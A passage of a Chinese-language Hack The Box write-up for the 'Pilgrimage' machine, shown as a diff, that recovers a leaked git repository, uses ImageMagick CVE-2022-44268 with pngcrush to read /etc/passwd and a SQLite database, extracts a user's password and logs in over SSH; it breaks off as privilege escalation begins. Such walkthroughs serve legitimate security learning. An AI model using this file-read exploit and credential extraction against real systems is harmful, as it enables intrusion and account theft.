commit.<br><br><span class="hljs-comment"># git status 查看最近的更改</span><br>┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ git status<br>On branch master<br>Changes not staged <span class="hljs-keyword">for</span> commit:<br>  (use <span class="hljs-string">&quot;git add/rm &lt;file&gt;...&quot;</span> to update what will be committed)<br>  (use <span class="hljs-string">&quot;git restore &lt;file&gt;...&quot;</span> to discard changes <span class="hljs-keyword">in</span> working directory)<br>        deleted:    assets/bulletproof.php<br>        deleted:    assets/css/animate.css<br>        deleted:    assets/css/custom.css<br>        deleted:    assets/css/flex-slider.css<br>        deleted:    assets/css/fontawesome.css<br>        deleted:    assets/css/owl.css<br>        deleted:    assets/css/templatemo-woox-travel.css<br>        deleted:    assets/images/banner-04.jpg<br>        deleted:    assets/images/cta-bg.jpg<br>        deleted:    assets/js/custom.js<br>        deleted:    assets/js/isotope.js<br>        deleted:    assets/js/isotope.min.js<br>        deleted:    assets/js/owl-carousel.js<br>        deleted:    assets/js/popup.js<br>        deleted:    assets/js/tabs.js<br>        deleted:    assets/webfonts/fa-brands-400.ttf<br>        deleted:    assets/webfonts/fa-brands-400.woff2<br>        deleted:    assets/webfonts/fa-regular-400.ttf<br>        deleted:    assets/webfonts/fa-regular-400.woff2<br>        deleted:    assets/webfonts/fa-solid-900.ttf<br>        deleted:    assets/webfonts/fa-solid-900.woff2<br>        deleted:    assets/webfonts/fa-v4compatibility.ttf<br>        deleted:    assets/webfonts/fa-v4compatibility.woff2<br>        deleted:    dashboard.php<br>        deleted:    index.php<br>        deleted:    login.php<br>        deleted:    logout.php<br>        deleted:    magick<br>        deleted:    register.php<br>        deleted:    vendor/bootstrap/css/bootstrap.min.css<br>        deleted:    vendor/bootstrap/js/bootstrap.min.js<br>        deleted:    vendor/jquery/jquery.js<br>        deleted:    vendor/jquery/jquery.min.js<br>        deleted:    vendor/jquery/jquery.min.map<br>        deleted:    vendor/jquery/jquery.slim.js<br>        deleted:    vendor/jquery/jquery.slim.min.js<br>        deleted:    vendor/jquery/jquery.slim.min.map<br><br>no changes added to commit (use <span class="hljs-string">&quot;git add&quot;</span> and/or <span class="hljs-string">&quot;git commit -a&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>通过查看日志和状态，我们看到有些文件被删除了，接下来可以使用命令来恢复</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ git checkout -- .<br><br>┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 27M<br>982572 drwxr-xr-x 5 i3eg1nner i3eg1nner 4.0K Jul  8 03:58 .<br>982207 drwxr-xr-x 3 i3eg1nner i3eg1nner 4.0K Jul  8 03:44 ..<br>982703 drwxr-xr-x 6 i3eg1nner i3eg1nner 4.0K Jul  8 03:58 assets<br>982731 -rwxr-xr-x 1 i3eg1nner i3eg1nner 5.5K Jul  8 03:58 dashboard.php<br>982573 drwxr-xr-x 6 i3eg1nner i3eg1nner 4.0K Jul  8 03:58 .git<br>982732 -rwxr-xr-x 1 i3eg1nner i3eg1nner 9.1K Jul  8 03:58 index.php<br>982733 -rwxr-xr-x 1 i3eg1nner i3eg1nner 6.7K Jul  8 03:58 login.php<br>982734 -rwxr-xr-x 1 i3eg1nner i3eg1nner   98 Jul  8 03:58 logout.php<br>982735 -rwxr-xr-x 1 i3eg1nner i3eg1nner  27M Jul  8 03:58 magick<br>982736 -rwxr-xr-x 1 i3eg1nner i3eg1nner 6.7K Jul  8 03:58 register.php<br>982737 drwxr-xr-x 4 i3eg1nner i3eg1nner 4.0K Jul  8 03:58 vendor<br></code></pre></td></tr></table></figure>
+
+<p>恢复后，我们简单查看各个文件和目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ tree<br>.<br>├── assets<br>│   ├── bulletproof.php<br>│   ├── css<br>│   │   ├── animate.css<br>│   │   ├── custom.css<br>│   │   ├── flex-slider.css<br>│   │   ├── fontawesome.css<br>│   │   ├── owl.css<br>│   │   └── templatemo-woox-travel.css<br>│   ├── images<br>│   │   ├── banner-04.jpg<br>│   │   └── cta-bg.jpg<br>│   ├── js<br>│   │   ├── custom.js<br>│   │   ├── isotope.js<br>│   │   ├── isotope.min.js<br>│   │   ├── owl-carousel.js<br>│   │   ├── popup.js<br>│   │   └── tabs.js<br>│   └── webfonts<br>│       ├── fa-brands-400.ttf<br>│       ├── fa-brands-400.woff2<br>│       ├── fa-regular-400.ttf<br>│       ├── fa-regular-400.woff2<br>│       ├── fa-solid-900.ttf<br>│       ├── fa-solid-900.woff2<br>│       ├── fa-v4compatibility.ttf<br>│       └── fa-v4compatibility.woff2<br>├── dashboard.php<br>├── index.php<br>├── login.php<br>├── logout.php<br>├── magick<br>├── register.php<br>└── vendor<br>    ├── bootstrap<br>    │   ├── css<br>    │   │   └── bootstrap.min.css<br>    │   └── js<br>    │       └── bootstrap.min.js<br>    └── jquery<br>        ├── jquery.js<br>        ├── jquery.min.js<br>        ├── jquery.min.map<br>        ├── jquery.slim.js<br>        ├── jquery.slim.min.js<br>        └── jquery.slim.min.map<br><br>11 directories, 37 files<br></code></pre></td></tr></table></figure>
+
+<p>发现连接的数据库和一个特殊的可执行文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br>  <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>  <span class="hljs-variable">$db</span> = new PDO(<span class="hljs-string">&#x27;sqlite:/var/db/pilgrimage&#x27;</span>);<br>  <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;prepare(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? and password = ?&quot;</span>);<br>  <span class="hljs-variable">$stmt</span>-&gt;execute(array(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>));<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$stmt</span>-&gt;fetchAll()) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>    header(<span class="hljs-string">&quot;Location: /dashboard.php&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    header(<span class="hljs-string">&quot;Location: /login.php?message=Login failed&amp;status=fail&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>顺便测试了一下 sql 注入，使用了 sqlmap，不过没成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://pilgrimage.htb/login.php --forms<br></code></pre></td></tr></table></figure>
+
+<p>之前对于 POST 注入，更多的是使用 burp 抓包然后保存为本地文件，再使用 sqlmap 操作，推荐这篇教程看看另外两种方法：<a target="_blank" rel="noopener" href="https://www.wangan.com/docs/1090">4.1 SqlMap之POST登陆框注入实战_「SqlMap中文版使用教程」 - 网安 (wangan.com)</a></p>
+<h2 id="Imagemagick-任意文件读取漏洞"><a href="#Imagemagick-任意文件读取漏洞" class="headerlink" title="Imagemagick 任意文件读取漏洞"></a>Imagemagick 任意文件读取漏洞</h2><p>那接下来就只有个可疑的可执行文件了，由于这个文件太大，尝试读取后没什么收获，我选择了直接执行试试，不过这里建议对于这些文件不要在本机中直接执行，防止有安全问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ ./magick<br>Error: Invalid argument or not enough arguments<br><br>Usage: magick tool [ &#123;option&#125; | &#123;image&#125; ... ] &#123;output_image&#125;<br>Usage: magick [ &#123;option&#125; | &#123;image&#125; ... ] &#123;output_image&#125;<br>       magick [ &#123;option&#125; | &#123;image&#125; ... ] -script &#123;filename&#125; [ &#123;script_args&#125; ...]<br>       magick -<span class="hljs-built_in">help</span> | -version | -usage | -list &#123;option&#125;<br></code></pre></td></tr></table></figure>
+
+<p>报错给了一些使用方法的教程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ ./magick -version<br>Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org<br>Copyright: (C) 1999 ImageMagick Studio LLC<br>License: https://imagemagick.org/script/license.php<br>Features: Cipher DPC HDRI OpenMP(4.5)<br>Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib<br>Compiler: gcc (7.5)<br></code></pre></td></tr></table></figure>
+
+<p>看了一眼 version，然后去谷歌这个工具到底是在干嘛</p>
+<p><img src="/pic/d57ee20929a5218d558c0e911d74f426_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>一个开源的图片处理工具，结合我们对首页的观察，大概可以判断出网站是在使用这个工具对用户上传的图片进行处理，此外这个工具的最新版是 7.1.1，但是 .git 泄露的文件中其版本号为 <code>7.1.0-49</code>，或许存在漏洞，尝试谷歌一下</p>
+<p><img src="/pic/91bf403cbc94bf2716afe3d3a3413fcd_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>存在任意文件读取漏洞，根据 CVE 来找 PoC：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/voidz0r/CVE-2022-44268">voidz0r&#x2F;CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read (github.com)</a></p>
+<p>这个脚本运行会提示 cargo 不存在，我不确定是否是需要我本机安装，找了个别的 PoC： </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">duc-nt&#x2F;CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC: CVE-2022-44268 ImageMagick Arbitrary File Read - Payload Generator (github.com)</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装依赖</span><br>apt-get install pngcrush imagemagick exiftool exiv2 -y<br><br><span class="hljs-comment"># 本机找一个png文件命名为vjp.png，将自己想查看的文件名放入参数中，工具会将其写入图片里</span><br>┌──(i3eg1nner㉿minilite)-[~/Downloads/Pilgrimage]<br>└─$ pngcrush -text a <span class="hljs-string">&quot;profile&quot;</span> <span class="hljs-string">&quot;/etc/hosts&quot;</span> vjp.png<br>  Recompressing IDAT chunks <span class="hljs-keyword">in</span> vjp.png to pngout.png<br>   Total length of data found <span class="hljs-keyword">in</span> critical chunks            =     32339<br>   Best pngcrush method        =   6 (ws 15 fm 6 zl 9 zs 0) =     32134<br>CPU time decode 0.017508, encode 0.292588, other 0.002413, total 0.314946 sec<br><br><span class="hljs-comment"># 看到信息是否被写入其中</span><br>┌──(i3eg1nner㉿minilite)-[~/Downloads/Pilgrimage]<br>└─$ exiv2 -pS pngout.png<br>STRUCTURE OF PNG FILE: pngout.png<br> address | chunk |  length | data                           | checksum<br>       8 | IHDR  |      13 | ............                   | 0xf7f684ff<br>      33 | pHYs  |       9 | .........                      | 0x952b0e1b<br>      54 | IDAT  |   32077 | x......E....9...&amp;..!.9D....Q.V | 0x26fba351<br>   32143 | tEXt  |      19 | profile./etc/passwd            | 0x465bd758<br>   32174 | IEND  |       0 |                                | 0xae426082<br><br><span class="hljs-comment"># 将图像上传到易受攻击的服务来触发 PoC</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/c36564ed14b943bc83e72756949a032c_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>将上面数据部分复制下来，通过 python 来解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Pilgrimage]<br>└─$ python3 -c <span class="hljs-string">&#x27;print(bytes.fromhex(&quot;726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a&quot;).decode(&quot;utf-8&quot;))&#x27;</span><br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>emily:x:1000:1000:emily,,,:/home/emily:/bin/bash<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>_laurel:x:998:998::/var/log/laurel:/bin/false<br></code></pre></td></tr></table></figure>
+
+<p>验证成功，确实存在任意文件读取漏洞，尝试读取 shadow 文件，失败。尝试读取 login.php 中提到的数据库文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Pilgrimage]<br>└─$ pngcrush -text a <span class="hljs-string">&quot;profile&quot;</span> <span class="hljs-string">&quot;/var/db/pilgrimage&quot;</span> vjp.png<br>  Recompressing IDAT chunks <span class="hljs-keyword">in</span> vjp.png to pngout.png<br>   Total length of data found <span class="hljs-keyword">in</span> critical chunks            =      2206<br>   Best pngcrush method        =   4 (ws 15 fm 0 zl 9 zs 1) =      1201<br>CPU time decode 0.001379, encode 0.005750, other 0.000666, total 0.008438 sec<br><br>┌──(kali㉿kali)-[~/Downloads/Pilgrimage]<br>└─$ exiv2 -pS pngout.png                            <br>STRUCTURE OF PNG FILE: pngout.png<br> address | chunk |  length | data                           | checksum<br>       8 | IHDR  |      13 | ............                   | 0xbeb798c5<br>      33 | pHYs  |       9 | .........                      | 0x009a9c18<br>      54 | tIME  |       7 | ......(                        | 0xc6655cae<br>      73 | tEXt  |      29 | Comment.Created with The GIMP  | 0xef64256e<br>     114 | IDAT  |    1144 | x..._lSU.....j<span class="hljs-string">&#x27;.....O......8P. | 0xfa9e0ce2</span><br><span class="hljs-string">    1270 | tEXt  |      26 | profile./var/db/pilgrimage     | 0x704d8d3d</span><br><span class="hljs-string">    1308 | IEND  |       0 |                                | 0xae426082</span><br></code></pre></td></tr></table></figure>
+
+<p>遇到个问题，0 数据太多，那就将有意义的部分截取下来放入刚才的解码命令中，最后发现了一个和之前 git log 中显示的用户名相同的有效字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Pilgrimage]<br>└─$ python3 -c <span class="hljs-string">&#x27;print(bytes.fromhex(&quot;180103172d656d696c796162696763686f6e6b79626f693132330a000000010ff7000ff7&quot;))&#x27;</span><br>b<span class="hljs-string">&#x27;\x18\x01\x03\x17-emilyabigchonkyboi123\n\x00\x00\x00\x01\x0f\xf7\x00\x0f\xf7&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试 ssh 登录，密码使用 <code>abigchonkyboi123</code> 和 <code>emilyabigchonkyboi123</code> 进行尝试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(pytool)─(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ ssh emily@10.10.11.219<br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.219 (10.10.11.219)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:uaiHXGDnyKgs1xFxqBduddalajktO+mnpNkqx/HjsBw.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.219<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">emily@10.10.11.219\&#x27;</span>s password:<br>Linux pilgrimage 5.10.0-23-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sat Jul  8 16:07:48 2023 from 10.10.16.42<br>emily@pilgrimage:~$ <span class="hljs-built_in">whoami</span><br>emily<br>emily@pilgrimage:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:b9:e8:f2 brd ff:ff:ff:ff:ff:ff<br>    altname enp3s0<br>    altname ens160<br>    inet 10.10.11.219/23 brd 10.10.11.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>emily@pilgrimage:~$ <span class="hljs-built_in">id</span><br>uid=1000(emily) gid=1000(emily) <span class="hljs-built_in">groups</span>=1000(emily)<br>emily@pilgrimage:~$ <span class="hljs-built_in">uname</span> -a<br>Linux pilgrimage 5.10.0-23-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux</span><br>emily@pilgrimage:~$ <span class="hljs-built_in">ls</span> -liah<br>total 36K<br>30 drwxr-xr-x 4 emily emily 4.0K Jul  8 16:10 .<br>39 drwxr-xr-x 3 root  root  4.0K Jun  8 00:10 ..<br>43 lrwxrwxrwx 1 emily emily    9 Feb 10 13:42 .bash_history -&gt; /dev/null<br>35 -rw-r--r-- 1 emily emily  220 Feb 10 13:41 .bash_logout<br>33 -rw-r--r-- 1 emily emily 3.5K Feb 10 13:41 .bashrc<br>44 drwxr-xr-x 3 emily emily 4.0K Jun  8 00:10 .config<br>46 -rw-r--r-- 1 emily emily   44 Jun  1 19:15 .gitconfig<br>55 drwxr-xr-x 3 emily emily 4.0K Jun  8 00:10 .<span class="hljs-built_in">local</span><br>34 -rw-r--r-- 1 emily emily  807 Feb 10 13:41 .profile<br>49 -rw-r----- 1 root  emily   33 Jul  8 15:50 user.txt<br>emily@pilgrimage:~$ <span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录成功，查看 <code>sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:~/.local/share/nano$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> emily:<br>Sorry, user emily may not run sudo on pilgrimage.<br></code></pre></td></tr></table></figure>
+
+<p>查看定时任务</p>
